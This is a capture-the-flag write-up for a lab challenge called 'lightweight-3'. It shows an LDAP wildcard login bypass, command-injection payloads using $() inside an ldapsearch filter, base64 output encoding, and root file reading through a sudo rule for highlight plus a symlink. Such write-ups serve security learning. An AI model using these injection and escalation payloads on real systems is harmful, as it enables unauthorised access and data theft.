# lightweight-3

### Enumeration

We are greeted by a simple login page. Trying different special characters reveals that it acts in a different way for these characters: `*`, `(`, `)`.

Parentheses cause a 500 error, and `*` lets us bypass the login - it's what we would expect from LDAP, and definitely not SQL. "Lightweight" could be a hint - LDAP stands for Lightweight Directory Access Protocol.

So by putting `username=*&password=*` we can bypass the auth.

This time we see some new text:

```
Hello Employee! To assist with your prism sales, feel free to explore our cutting-edge prism database:
```

Selecting one of the options and clicking `Search` makes a request: `GET /search?prism=BigPrism`

The output looks like the output of a `ldapsearch` command. We should try command injection.

### Command Injection

```
GET /search?prism='
```

returns: `/bin/sh: 1: Syntax error: ")" unexpected`. Just trying to break out of the command using `;` returns an error:

```json
{"error":"Bad characters detected"}
```

This leaves either adding flags to the command, or using `$()`. In the original output of `ldapsearch` we also see where exactly we are injecting:

```
filter: (&(objectclass=prismProduct)(cn=BigPrism))
----------------------------------------^
here
```

It allows us to craft an input which properly executes without guessing:

```
prism=))'+$(whoami)+'$((
```

...which returns:

```json
{
    "data":"# extended LDIF\n#\n# LDAPv3\n# base <ou=prisms,dc=bts,dc=ctf> with scope subtree\n# filter: (&(objectclass=prismProduct)(cn=))\n# requesting: prism $(()) \n#\n\n# search result\nsearch: 2\nresult: 0 Success\n\n# numResponses: 1\n",
    "image":null
}
```

We see that we are running as `prism`. Listing the currect directory and reading a file named `hint` reveals: "Flag is in /root/flag.txt :)". So we need to escalate from `prism` to `root`.

### Escalation

Let's try `sudo -l`:

```
prism=))'+$(sudo+-l)+'$((
```

Unfortunately it returns a weird ldap filter error starting with `ldapsearch: invalid option -- 'i'`. Probably the output contained something which was interpreted by `ldapsearch`. Base64 encoding helps:

```
prism=))'+$(sudo+-l|base64+-w0)+'$((
```

Decoded output:

```
Matching Defaults entries for prism on 3d8bb04bd441:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prism may run the following commands on 3d8bb04bd441:
    (ALL) NOPASSWD: /usr/bin/highlight -i /home/prism/*
```

This is the crucial line:

```
(ALL) NOPASSWD: /usr/bin/highlight -i /home/prism/*
```

`highlight` is in [GTFOBins](https://gtfobins.github.io/gtfobins/highlight/), with a sudo section:

```sh
LFILE=file_to_read
sudo highlight --no-doc --failsafe "$LFILE"
```

Before reading the flag we have to bypass the path pattern `/home/prism/*` by creating a symlink to `/root/flag.txt`:

```
prism=))'+$(ln+-s+/root/flag.txt+/home/prism/flag.txt)+'$((
```

This is the final request to read the flag:

```
prism=))'+$(sudo+/usr/bin/highlight+-i+/home/prism/flag.txt)+'$((
```
